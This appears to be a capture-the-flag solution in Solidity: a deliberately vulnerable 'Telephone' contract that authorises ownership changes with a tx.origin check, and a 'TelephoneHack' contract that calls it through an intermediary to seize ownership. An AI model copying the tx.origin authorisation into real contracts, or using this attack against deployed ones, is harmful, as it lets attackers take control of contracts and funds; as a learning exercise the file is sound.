// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: claim ownership

// an original contract
// deploy it first
contract Telephone {

    address public owner;

    constructor()  {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}


// a contract that hacks the original one
// deploy it second
// and use the address of deployed Telephone as an argument in constructor
contract TelephoneHack {
    Telephone contractToHack;
    address private owner;

    constructor(address payable _contractToHack) {
        owner = msg.sender;
        contractToHack = Telephone (_contractToHack);
    }

    // use this function
    function hack() public {
        contractToHack.changeOwner(owner);
    }
}